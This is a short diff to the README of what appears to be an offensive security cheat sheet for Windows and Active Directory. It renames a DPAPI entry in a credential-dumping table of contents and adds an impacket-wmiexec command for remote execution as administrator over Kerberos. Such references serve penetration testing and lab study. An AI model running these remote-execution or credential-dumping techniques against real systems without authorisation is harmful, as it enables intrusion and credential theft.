@@ -28,7 +28,7 @@ it is the first version of this repo, many things will be added later, so stay t
   - [Credentials Dumping](#credentials-dumping)
     - [LSASS Dumping](#lsass-dumping)
     - [NTDS Dumping](#ntds-dumping)
-    - [DPAPI Dumping](#dpapi-dumping)
+    - [DPAPI Abusing](#dpapi-abusing)
     - [LSA Dumping](#lsa-dumping)
     - [SAM Dumping](#sam-dumping)
     - [Dump Registry Remotely and Directly](#dump-registry-remotely-and-directly)
@@ -449,8 +449,10 @@ sc.exe start dns
 
 ### WMIExec
 
-
-
+*uses kerberos auth*
+```powershell
+impacket-wmiexec -k -no-pass administrator@10.10.10.248
+```
 
 ## Credentials Dumping
 
